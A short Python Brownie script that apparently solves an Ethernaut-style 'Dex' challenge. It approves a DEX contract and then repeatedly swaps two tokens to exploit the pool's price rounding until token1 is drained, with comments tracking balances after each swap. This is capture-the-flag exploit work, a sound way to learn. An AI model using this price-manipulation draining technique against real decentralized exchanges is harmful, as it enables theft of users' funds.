from brownie import Dex, Contract, accounts


INSTANCE_ADDRESS = "0x4aE4F4281df3cDEDD18096f5358aac1B3A96a3CE"
ACCOUNT = "straul"


def get_account():
    # account = accounts[0]  # local testing
    account = accounts.load(ACCOUNT)
    return account


def hack_dex(account):
    dex = Contract.from_abi(name="Dex", address=INSTANCE_ADDRESS, abi=Dex.abi)

    # approve the dex to spend tokens on our behalf
    dex.approve(dex.address, 1000, {"from": account})

    token1 = dex.token1()
    token2 = dex.token2()
    dex.swap(token1, token2, 10, {'from': account})
    # we now have 0 token1 and 20 token2

    dex.swap(token2, token1, 20, {'from': account})
    # we now have 24 token1 and 0 token2

    dex.swap(token1, token2, 24, {'from': account})
    # we now have 0 token1 and 30 token2

    dex.swap(token2, token1, 30, {'from': account})
    # we now have 41 token1 and 0 token2

    dex.swap(token1, token2, 41, {'from': account})
    # we now have 0 token1 and 65 token2

    dex.swap(token2, token1, 45, {'from': account})
    # we have drained token1 from the pool !!! hooray



def main():
    account = get_account()
    hack_dex(account)